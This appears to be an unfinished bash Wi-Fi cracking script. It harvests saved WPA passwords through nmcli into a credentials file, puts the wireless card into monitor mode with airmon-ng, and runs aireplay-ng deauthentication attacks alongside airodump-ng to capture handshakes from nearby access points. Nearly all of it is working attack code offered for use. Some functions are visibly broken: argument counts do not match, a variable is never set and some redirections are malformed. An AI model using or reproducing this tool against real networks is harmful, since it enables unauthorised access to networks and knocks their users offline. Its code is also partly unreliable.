function dirInit () {
	if [[ -d "cracker" ]];then
		if [[ -L "cracker" ]]; then
			rm -rf cracker
		fi
		rm -rf cracker
	fi
	mkdir cracker
}

# metadata means you will have bssid, ssid, channel, and security of APs saved in <file: aval_APs> 
function APmetadata () {
	# nmcli heps us list APs info with certain filtering or fields with -f option 
	nmcli -f BSSID,SSID,CHAN,SECURITY dev wifi list > cracker//aval_APs
}

# return password if it is correct, else return empty string, if usuage not match return 1 
function getPass () {
	if [[ $# -ne 1 ]]; then
		echo "Usuage: $0 <ap>"
		exit 1
	fi

	ap="$1"
	pass=$(nmcli -s -g 802-11-wireless-security.psk connection show "$ap" 2> /dev/null)

	# this part will verify password but cant rely, the purpose of doing additional check is just to reduce no. of APs to attack, if already password correctly cached, it is not necessary to attack, you MAY BE PROMPTED FOR PASSWORD IF YOU ARE RUNNING THIS SCRIPT IN GUI BASED PLATFORM
	# check if password is correct or incorrect (this is not reliable but worth it)
	if [[ -n "$pass" ]]; then
		# you can do with wpa_supplicant but hey for better time managemet, increase in wait time will give more reliable, but could slow our attack
		waitTime=2
		nmcli --wait $waitTime dev wifi connect "$ap" &> /dev/null
		if [[ $? -eq 0 ]]; then
			echo "$pass" # correct password
			return 0
		else
			# if password is not authenticated, add AP to 'toCrack' file 
			echo "$ap" >> cracker//toCrack
			return 2 # password incorrect or waitTime expires
		fi
	fi
}

function add_APs_toCrack () {
	# add access points to crack  
	nmcli -f SSID dev wifi list | tail -n +2 | sed '/^-- *$/d' >> cracker//APs
	# this will ensure no duplicate APs are in our list
	awk '!seen[$0]++' cracker//APs > output.txt && mv output.txt cracker//APs
}

# known_APs are such which password your devices already known of 
function known_APs () {
	declare -A known_password
	# nmcli again comes to rescue use to find the name of AP which currently we are connected to, this is of course known AP
	current_AP=$(nmcli -t -f ACTIVE,SSID dev wifi | grep '^yes' | cut -d ':' -f 2)

	if [[ -n "$current_AP" ]]; then
		# to get pass in ssh session, sudo required 
		current_pass=$(nmcli -s -g 802-11-wireless-security.psk connection show "$current_AP")
		known_password["$current_AP"]+="$current_pass"
	fi

	# known AP will not stop here because, your device may have saved passwords from previous connection and they are still connectable meaning passwords are unchanged 
	# first create direcotry to store files required in crack 
	nmcli -t -f NAME,TYPE connection | grep wireless | cut -d ':' -f 1 > cracker//APs

	# read each AP from file *APs* and try to connect
	{
		while read ap; do
	  		if [[ -n "$ap" && "$ap" != "$current_AP" ]]; then
	  			# as device can store incorrect/previous password, getPass function will only return correct password, so we can say that pass is only the correct one, incorrect password means empty value 
	  			pass=$(getPass "$ap")
	  			if [[ -n "$pass" && "$pass" != 1 ]]; then
	  				known_password["$ap"]+="$pass"
	  			fi
	  		fi
		done <cracker//APs

		# since cracker/APs is just for checking if stored credentials are correct or not, you will like to add mode APs in your attack list
		add_APs_toCrack

		# network may be disconnected, reconnect to previous AP
		if [[ "$current_AP" && "$current_pass" ]]; then
			nmcli dev wifi connect "$current_AP" "$current_pass" &> /dev/null
		fi

		# print found credentials
		echo FoundPasswords:
		for ap in "${!known_password[@]}";do
			echo "${ap}:${known_password["$ap"]}" | tee -a cracker//found_credentials
		done
		unset ap pass
	}
}

# ....................................DANGER FUNCTIONS...............................

function getMainAdapter_Name () {
	# no need to echo because the following commands will already print first wireless adapter 
	iw dev | awk '/Interface/ {print $2}'
	# can also be achived with 
	# nmcli -t dev st | grep "wifi:" | awk -F ':' '{print $1}'
}

# this will take AP name as arg, it is because we will monitor that particular AP to attack, according to the name of AP we will get its info and try and attack
function enableMonitorMode () {
	if [[ $# -ne 1 ]]; then
		echo "Usuage: $0 <channelNumber>"
		exit 1
	fi
	adapter=$(getMainAdapter_Name)
	echo "Killing all process that could interfere mon mode...." >&2
	{
		airmon-ng check kill &>2 /dev/null
		airmon-ng start "${adapter}" "${channel}" &>2 /dev/null
		if [[ $? -eq 0 ]]; then
			echo "Monitor mode enabled...At '${adapter}mon'" >&2
			echo "${adapter}mon"
			return 0
		fi
		echo "Monitor mode start failed...Aborting"
		exit 1
	}
}



function getAP () {
	if [[ $# -ne 1 ]]; then
		echo "Usuage: $0 <lineWithSSID>"
		exit 1
	fi

	# well it can access line from caller, but it is not always the case that caller will have line so, we have to pass arg and the first arg is consider as the line which will have ssid somewhere 
	line="$1" 
	awk -F: '{print $7}' <<< "$line"
}

function getMacAP () {
	if [[ $# -ne 1 ]]; then
		echo "Usuage: $0 <lineWithMacAP>"
		exit 1
	fi
	line="$1"
	# you can supply variable for awk to program with <<< operator, if you don't sed you will get output that contains '\:' at the end of each field of mac address so you should replace that '\:' with just ':'
	# this is assigned in some vaiable at caller function
	awk -F: '{print $1":"$2":"$3":"$4":"$5":"$6}' <<< "$line" | sed 's/\\:/:/g'
}

function getChannel () {
	if [[ $# -ne 1 ]]; then
		echo "Usuage: $0 <lineWithChannelNumber>"
		exit 1
	fi
	line="$1"
	# you can supply variable for awk to program with <<< operator, if you don't sed you will get output that contains '\:' at the end of each field of mac address so you should replace that '\:' with just ':'
	awk -F: '{print $8}' <<< "$line"
}

function capture_deauth () {
	if [[ $# -ne 2 ]]; then
		echo "Usuage: $0 <bssid> <channel> <adapter>"
		exit 1
	fi
	bssid="$1"
	channel="$2"
	adapter="$3"

	# start captuing in sub shell
	{
		cap_file=${bssid:0:3}
		airodump-ng -c "$channel" --band abg --bssid "$bssid" -w "$cap_file" "$adapter" > cracker//logHandshake 2> cracker//errlog
	} &
	pid_capture=$!

	# start duauth attack
	{
		aireplay-ng --deauth -a "$bssid" "$adapter" &> /dev/null
	} &
	pid_deauth=$!

	# wait for handshake or wait till timeout 
	while true; do
		if grep "Handshake" cracker//errlog &> /dev/null; then
			kill "$pid_deauth"
			kill "$pid_capture"
			return 0 # capture success, this may be fake authentication capture also,,,
		fi
		sleep 1
	done

}

# continue from here 
function start () {
	# we can not simple read from that file again, yes the file is available but it has been so long (we have tried connecting APs with wait of 5 sec so you can guess how much time we have spent, that AP may have gone offline) since it has been created, we'll modify that again 
	APmetadata # this will give use list and info of AP in file cracker/toCrack field seperated by :

	# reading each line and parsing for each required part 
	while read line; do
		ap=$(getAP "$line")

		# it can be empty if our nmcli could not get ssid 
		if [[ -z "$ap" ]]; then
			# if it is empty, you can go find ssid process but for now we will skip empty ssid 
			continue
		fi

		# get mac of AP if AP is not hidden/empty and channel too
		bssid=$(getMacAP "$line")
		channel=$(getChannel "$line")
		adapter=$(enableMonitorMode "$channel")
		capture_deauth "$bssid" "$channel" "$adapter"

	done <cracker//toCrack
}

# ........................................MAIN FUNCTION................................
function main () {
	# collect APmetadata that will be saved on cracker/aval_APs
	dirInit
	# collect knwon APs and unknown will be saved on cracker/toCrack
	known_APs
}

# ....................................START CALLING...........................................
main

# work with cracker/toCrack
# this part NOW DANGEROUS, your card will be in *MONITOR MODE*, WE WILL USE `aircrack-ng` suite, maybe `mdk3` to DEAUTH and so on.

